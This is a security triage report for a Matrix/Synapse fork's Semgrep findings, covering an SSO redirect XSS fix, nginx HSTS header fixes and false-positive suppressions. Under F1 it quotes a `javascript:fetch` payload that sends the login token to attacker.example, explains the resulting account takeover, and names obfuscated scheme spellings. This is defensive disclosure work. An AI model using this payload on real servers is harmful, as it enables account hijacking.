# Semgrep triage — 2026-10-11

Every finding from the ruleset CI runs (`p/security-audit` + `p/secrets`, the
`Semgrep SAST` job in `.github/workflows/security.yml`), with the disposition
and the reasoning for each. The 2026-09-13 pass
([semgrep-triage-2026-09-13.md](semgrep-triage-2026-09-13.md)) left 95 findings
visible on purpose rather than baseline them. This pass fixes two real defects
behind those findings and explains the rest on the line where each was
reported. Nothing is baselined, no `.semgrepignore` exists, and neither the
rulesets nor the workflow changed.

**Push scan: 95 findings before, 0 after.**

Reproduce what CI runs:

```bash
# CI's semgrep-action@v1 is semgrep 1.36.0 running `semgrep ci` with:
SEMGREP_RULES="p/security-audit p/secrets" semgrep ci
# The same full scan with a current semgrep (1.180.0 here):
semgrep scan --config p/security-audit --config p/secrets --error --metrics=off
```

Both were run from the repository root. Before this change: semgrep 1.36.0
`semgrep ci` with a simulated `push` event for develop `3fe2ec3` reported
`Found 95 findings (95 blocking) from 272 rules` and exited 1, and 1.180.0
reported 94 (the difference is `MiniProfile.tsx`, below). After: both report 0
and exit 0.

---

## Why the job failed on every push but passed on pull requests

That was the hypothesis, and it holds. From the action's source and the runs:

-   `semgrep/semgrep-action@v1` is a Docker action on
    `returntocorp/semgrep-agent:v1`. The published image (built 2023-09-06 from
    semgrep-action `5497961`, labelled "This project is deprecated") is
    `returntocorp/semgrep:1.36.0` plus a wrapper that copies the `config` input
    into `SEMGREP_RULES` and then `exec`s `semgrep ci`.
-   `semgrep ci` sets a baseline commit only for `pull_request` and
    `pull_request_target` events (`GithubMeta.merge_base_ref` in 1.36.0). A PR is
    scanned diff-aware: only files changed since the merge base, and only
    findings that are not already present at the merge base. A `push` has no
    baseline, so the whole tree is scanned.
-   It exits 1 if any finding is blocking. A finding blocks unless its rule's
    metadata sets `dev.semgrep.actions` without `block`, and none of these
    registry rules does. So every finding already in the tree blocked each
    push, and none of them appeared on a PR that did not add it.
-   No annotations: without an app token `semgrep ci` writes findings to the job
    log only. Its output has no workflow-command lines, and the check run
    reports `annotations_count: 0`.

Across the 56 non-cancelled runs from 2026-09-09 to 2026-10-09, `Semgrep SAST`
failed on all 20 pushes to develop and passed on all 36 pull requests. A push
scan took about 50 s and a PR scan about 20 s (for example, run 37934008153 on
`3fe2ec3` against run 37930906603). The action was behaving as designed. The
push scan was reporting the backlog that the previous pass left in place.

### The action is deprecated. That is not changed here.

The image pins semgrep 1.36.0 (August 2023). semgrep.dev's version check now
answers "Versions prior to 1.76.0 are no longer supported". 1.36.0 also
reports 47 files only partly analysed because of parse errors, where 1.180.0
reports about 100% of lines parsed. The documented replacement is
`semgrep ci` in the `semgrep/semgrep` image, with the same `SEMGREP_RULES`. It
behaves the same way: diff-aware on PRs, full scan on push, every finding
blocking. Switching would not have turned the push scan green, so it is left as
a separate change. Every suppression below was checked to take effect under
both 1.36.0 and 1.180.0, so the switch will not need this triage redone.

Once the backlog is gone, a red push scan means something new. Either a merged
PR added a finding that the diff-aware scan missed, or the registry rulesets
changed, since they are fetched unpinned on every run.

---

## Fixed

### F1. The SSO confirmation page could hand the login token to a `javascript:` URL

Reported as `var-in-href` on `synapse/res/templates/sso_redirect_confirm.html:35`.
**A real vulnerability.**

When a client starts SSO it supplies `redirectUrl`. `AuthHandler.complete_sso_login`
appends the new login token to that URL and, unless the URL is on
`sso.client_whitelist`, renders it as this page's "Continue" link. Nothing
checked the scheme. The new regression test, run on develop, got this back:

```text
<a href="javascript:fetch(&#39;https://attacker.example/?%27+document.links%5B0%5D.href%29%2F%2F=&amp;loginToken=syl_…" class="primary-button">Continue</a>
```

A browser percent-decodes a `javascript:` URL before running it. One click on
"Continue", on the homeserver's own page, therefore runs
`fetch('https://attacker.example/?'+document.links[0].href)//…`. The link's own
`href` contains the login token, so the token goes to the attacker, who can
exchange it at `POST /login` (`m.login.token`) for an access token to the
account.

-   **Who was exposed:** any server running this fork with Synapse's own SSO
    configured (CAS, SAML or OIDC). `infra/single-server-baseline` builds this
    fork (`blackout-synapse:stable`). Its `synapse/homeserver.yaml.template`
    configures classic `oidc_providers` (a Keycloak or Authentik issuer, set
    from the environment) and no `sso.client_whitelist`. Every SSO login on that
    stack therefore passes through this page, so its users are used to clicking
    "Continue". Any install of that stack with an OIDC issuer set was exposed.
    Whether the live host is one was not checked from here.
    `deploy/docker/blackout-backend` runs upstream's
    `ghcr.io/element-hq/synapse:v1.130.0` with local or MAS auth, and its
    template configures no `oidc_providers`, `saml2_config` or `cas_config`.
-   **Upstream:** element-hq/synapse `develop` has the same code as of today:
    there is no scheme check in `complete_sso_login`, and the template is
    identical. So this fix is not a port, and the issue should be reported to
    upstream through the Matrix.org security disclosure policy. This pass did
    not report it.
-   **Fix:** `complete_sso_login` now refuses a redirect URL whose scheme is
    `javascript:`, `vbscript:` or `data:`, and does so before it mints a token.
    It answers with the existing SSO error page (400, `invalid_request`). The
    scheme is read the way a browser reads it: leading and trailing control
    characters and spaces are stripped, tabs and newlines anywhere are removed,
    and case is ignored. Without that normalisation, `" java\tscript:"` would
    slip through. The check is a denylist because native clients redirect to
    their own URL schemes, and those keep working.
-   **Tests:** `tests/rest/client/test_login.py`.
    `CASTestCase.test_cas_redirect_refuses_script_schemes` covers six spellings,
    including the obfuscated ones. On develop it fails (200, with the link
    above); with the fix it passes. `test_cas_redirect_confirm_custom_scheme`
    checks that `com.example.app:/sso-callback` still gets the confirmation page.
-   **Then suppressed at the template:** the rule matches the template text and
    cannot see the check in Python. The template line therefore keeps a
    `nosemgrep` that points at the check. The order matches the `cas.py` case in
    the 2026-09-13 triage: fix first, then suppress.

### F2. nginx locations that set their own headers dropped HSTS

Reported as `header-redefinition` (58 findings): `infra/nginx/sites-available/theblackout.app.conf`
(15), `infra/single-server-baseline/nginx/sites-available/theblackout.app.conf`
(41) and `deploy/docker/blackout-backend/nginx/nginx.conf` (2). **A real
defect.** The 2026-09-13 pass deferred it because no nginx was available to
test against. This time nginx was available.

**Measured, not inferred.** Each config was run on the local nginx 1.24.0 and on
`nginx:1.27-alpine` (1.27.5), the image both compose stacks use. Upstreams were
local stubs. Every location was requested with GET, HEAD and OPTIONS (POST
where a location treats it differently), again with the upstreams down, and
with a burst past the login rate limit. Status and headers were recorded for
each response. Before the change, the following HTTPS responses had no
`Strict-Transport-Security`: 31 of 60 (infra), 41 of 75 (single-server) and 41
of 60 (backend). They include:

-   every CORS location and its preflight, and the `.well-known` endpoints;
-   `/tiles/` on the single-server API host;
-   every error response that nginx answers from `@matrix_cors_error`
    (502/503/504, and 429 on single-server). That covers federation and MAS
    routes whenever their upstream is down, even though those locations set no
    headers themselves.

On the single-server apex, `/.well-known/matrix/client` also lost the whole
`security-headers.conf` set. The rule did not flag that one.

The rule reached only part of the defect. In the backend config it flagged 2 of
the 34 location-level `add_header` lines, all of which had the defect.

**Fix:** each stack has a new `snippets/hsts.conf` with its existing HSTS value:
`max-age=63072000; includeSubDomains; preload` for `infra/nginx` and
single-server, and `max-age=31536000; includeSubDomains` for the backend. The
server block includes it in place of the literal `add_header`, and so does
every `location` and `if` that sets its own headers. The single-server apex
`.well-known` location includes `security-headers.conf` again. Both compose
files mount the new snippet, and `infra/nginx/README.md` copies it.

**Result, on both nginx versions:**

-   The only change is HSTS added to the 31, 41 and 41 responses above, plus the
    five other `security-headers.conf` headers on the 4 apex `.well-known`
    responses.
-   No status code changed, no header was removed, and no CORS header changed.
-   Every HTTPS response now carries exactly one HSTS header.
-   `nginx -t` output is identical before and after. 1.27's existing
    `listen ... http2 is deprecated` warning is unchanged.
-   The compose wiring was checked with the reverse-proxy mounts exactly as
    `docker compose config` renders them, in the compose image. The config gets
    through nginx's parse ("syntax is ok") through those mounts. The run then
    stops binding `[::]:80`, which this sandbox cannot do, before the change and
    after it alike. A throwaway `www-data` user was created in the container to
    get past item 1 under "Found along the way".
-   Without the new mount, nginx refuses at parse time:
    `open() "/etc/nginx/snippets/hsts.conf" failed (2: No such file or directory)`.

That is the failure an operator will see if the snippet is not deployed with
the site config.

**Why the 58 lines still carry `nosemgrep`.** The rule flags every `add_header`
inside a `location`, whatever the server block sets. Minimal configs show it:

-   a location with an `add_header` is flagged when the server block sets no
    header at all;
-   it is still flagged when the location includes the server's headers itself.

So the rule cannot recognise the fix its own message recommends ("explicitly
set all headers"). After the change these 58 lines are false positives. Each
carries an inline `nosemgrep`, and one comment on each server block gives the
reason. The alternatives were:

-   moving every location's header set into its own snippet: about ten new
    files and compose mounts per stack;
-   rewriting CORS as server-level variables: a large semantic rewrite of
    production ingress;
-   a file-scope ignore, which would also hide the next real one.

**Context for impact.** `theblackout.app` is on the HSTS preload list through
its TLD (hstspreload.org: `preloaded`, `preloadedDomain: app`). Browsers
therefore already refused plain HTTP to these hosts on that domain. The configs
are also templates for other domains (the backend one takes `${SERVER_NAME}`),
and on those the header is the only protection. The live hosts sit behind
Cloudflare and were not checked against these files.

**Operator:** deploy the snippet, the compose mount and the site config
together, or nginx will not start. The single-server live directory is synced by
hand (see `RUNBOOK.md`). Live hosts are unchanged until then.

---

## Explained: false positives, suppressed on the line

Each suppression is a `nosemgrep: <rule-id>` on the reported line or the line
directly above it, with a one-line justification beside it. The full scans
before and after this change, under semgrep 1.36.0 and 1.180.0, report each
finding without its comment and none with it.

| Rule                                     | Where                                                                                                                                                                                     | Why it is safe                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `var-in-href` ×10                        | `synapse/res/templates/`: `add_threepid`, `notice_expiry`, `notif`, `notif_mail`, `password_reset`, `registration`, `room`, `sso_auth_confirm`, `sso_new_user_consent`, `terms` (`.html`) | Each `href` is built by the server: `public_baseurl` or the configured client base URL (else `https://matrix.to` / `https://vector.im`), plus a fixed path and URL-encoded parameters (`Mailer`, `AccountValidityHandler`, the consent servlets). `sso_auth_confirm` links to the identity provider's login URL, which comes from admin config or the IdP's discovery document, never from a user (authlib's `validate_authorization_endpoint` also requires https, except for a provider configured with `skip_verification: true`). No user controls a scheme. Jinja autoescaping handles the rest.                                                                                                                                                                                                                           |
| `var-in-href` ×6, `var-in-script-tag` ×4 | `docs/website_files/theme/index.hbs`                                                                                                                                                      | mdbook's stock theme. `path_to_root`, chapter links, the git URLs and theme names come from `book.toml` and `SUMMARY.md` when the docs are built. No visitor input reaches the template. The book was rendered with mdbook 0.4.40 before and after (0.4.17, which upstream's docs workflow pins, no longer compiles with current Rust). On each of the 101 pages the only difference is five JS comment lines inside `<script>` (three distinct); no Handlebars comment text appears. One `var-in-script-tag` finding (`html.classList.remove('{{ default_theme }}')`) is not suppressed by its annotation: the two inserted comment lines stretch that `<script>` block past the rule's ten-line pattern span, so the rule no longer matches it at all. The value still comes from `book.toml`, so the conclusion is the same. |
| `exec-detected` ×4                       | `scripts-dev/check_pydantic_models.py`, `check_schema_delta.py` (×2), `schema_versions.py`                                                                                                | Developer scripts that run this repository's own code: literal test snippets in the same file, or `synapse/storage/schema/__init__.py` from the working tree, `origin/develop` or a release tag. They cross no trust boundary that running the test suite does not already cross.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `dynamic-urllib-use-detected`            | `contrib/graph/graph.py`                                                                                                                                                                  | The URL is an f-string that begins `http://`, so the `file:` concern cannot arise. Host and room are the script's own arguments.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| `dynamic-urllib-use-detected` ×2         | `scripts-dev/release.py`                                                                                                                                                                  | The maintainers' release script. The URLs are a GitHub API asset URL and a fixed `https://api.github.com` address.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `dynamic-urllib-use-detected`            | `synapse/media/url_previewer.py` (`_parse_data_url`)                                                                                                                                      | Only reached for `data:` URLs: its one caller checks first. This pass adds the same check inside the function, which now raises unless the URL starts with `data:`, so `urlopen` can never be given a `file:` URL whoever calls it. Without that check the function reads a local file when handed a `file:` URL. The new `test_parse_data_url_refuses_other_schemes` shows this: it fails on develop with a 200 `DownloadResult` for the file, and passes now.                                                                                                                                                                                                                                                                                                                                                                 |
| `dynamic-urllib-use-detected`            | `synapse/util/managed_hosting.py`                                                                                                                                                         | The health check's URL is the operator's `--url`, or a fixed `http://` URL in `hosting_smoke.py`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `insecure-hash-algorithm-sha1`           | `synapse/state/v1.py`                                                                                                                                                                     | Room version 1's state resolution defines this tie-break as the SHA-1 of the event ID. It orders events and protects nothing. Changing it would make this server resolve state differently from every other server.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `detected-bcrypt-hash` ×3                | `debian/hash_password.ronn`                                                                                                                                                               | Man-page examples of what `hash_password` prints for `p@ssw0rd`. They are not credentials. A comment inside the code block would appear in the rendered page, so each annotation sits just outside it. Rendering with ronn-ng 0.10.1 confirms the comments do not appear. Each example now renders as two adjacent blocks (command, output). `debian/hash_password.1` was not regenerated, and nothing in this repository builds it.                                                                                                                                                                                                                                                                                                                                                                                            |
| `missing-internal`                       | `deploy/docker/blackout-backend/nginx/nginx.conf`                                                                                                                                         | `proxy_pass $blackout_app` uses the constant set on the line before. It is a variable only so that the resolver looks `blackout-app` up per request. It is not request input. This is the public `location /`, so `internal` would make the whole site return 404.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `react-dangerouslysetinnerhtml` ×2       | `apps/blackout-client/.../profile/ProfileModal.tsx`, `MiniProfile.tsx`                                                                                                                    | A user's bio rendered as HTML. Re-read for this pass rather than taken from the previous one: `mdToHtml` escapes `& < > " '` before adding any markup, so its output can only hold attribute-less `strong`/`em`/`code`/`br` and escaped text. `sanitizeMatrixHtml` then unwraps any tag outside its allowlist and strips every attribute except `data-mx-*` and an `href` starting `https://`, `http://`, `mailto:` or `mxc://`. Either step alone would do. `MiniProfile.tsx` is reported by semgrep 1.36.0 only.                                                                                                                                                                                                                                                                                                              |

**A correction to 2026-09-13.** That pass found that a `nosemgrep` comment does
not attach to `react-dangerouslysetinnerhtml` "in JSX attribute position", and
left the finding visible. That is true of attribute position. It is not where
the finding is. The rule reports the `__html` value (its sink uses
`focus-metavariable`), so the finding's first line is the `__html:` line inside
the `{{ }}` object literal. A JS comment on the line above it is legal there,
and binds under both semgrep versions. The comment in `ProfileModal.tsx` now
says so.

---

## Found along the way, not fixed here

1.  **The single-server reverse proxy cannot start as committed.**
    `infra/single-server-baseline/nginx/nginx.conf` sets `user www-data;`, but
    its compose image `nginx:1.27-alpine` has only a `www-data` group. Through
    the compose service, `nginx -t` fails with `getpwnam("www-data") failed`, on
    develop as well. The live host must run a different config or image. The
    worker user is not changed here, because that changes file ownership on a
    live host.
2.  **Maubot traffic goes to Synapse.** In the backend `nginx.conf`, the prefix
    location `/_matrix/maubot/` has no `^~`. The matching regex location
    `~ ^(/_matrix|/_synapse/client)` therefore wins, and maubot requests go to
    Synapse. In the header matrix, `/_matrix/maubot/x` was answered by the
    Synapse stub.
3.  **`synapse/util/managed_hosting.py` was unrecorded.** It is a Blackout file
    outside `blackout_runtime/` that was not recorded in `PATCHES.md`. This
    pass's entry there names it.
4.  **Same defect in a file the rule cannot see.** Finding F2 in
    [framing-headers-2026-10-09.md](framing-headers-2026-10-09.md)
    (`deploy/docker/nginx-templates/default.conf.template`) has the same
    inheritance defect and is still open as recorded there. This rule does not
    scan `*.conf.template` files.

## What this triage deliberately does not do

It adds no `.semgrepignore`, baseline or file-scope ignore. It does not change
a ruleset or a blocking setting. The one workflow change widens it: pull
requests that touch only `infra/**` or `deploy/**` now run the security
workflow too, since 59 of the 95 findings sat in paths no PR scan ever ran on.
Every remaining `nosemgrep` names its rule and sits on one reported line; its
reason is next to it (for the nginx `add_header` lines, one comment per server
block) and in this file. A new finding in these files will still be reported,
with one exception: the `add_header` inheritance defect itself. The
header-redefinition rule flags every `add_header` inside a location whether or
not the block re-includes the server-level headers, so it never told a fixed
config from a broken one, and nothing machine-checks that class now (nothing
did before either). The per-location response-header check used for this fix
is the only evidence; see the open items.

**Later the same day** (the Black Mask panel locations in both front proxies;
[framing-headers-2026-10-09.md](framing-headers-2026-10-09.md), follow-up):
those locations carry 24 more `nosemgrep` comments for the header-redefinition
rule, 12 per site config, on lines that neither 1.36.0 nor 1.180.0 reports. They
follow the convention above, so a rule or engine change that starts reporting
them shows the reason next to them. `tools/ci/check-embed-proxy-framing.mjs` now
machine-checks part of the inheritance class: in the `theblackout.app` server
block of both proxies, a location that sets its own headers must include
`security-headers.conf` again, and the panel locations must restate that set
exactly. The other server blocks are still unchecked.
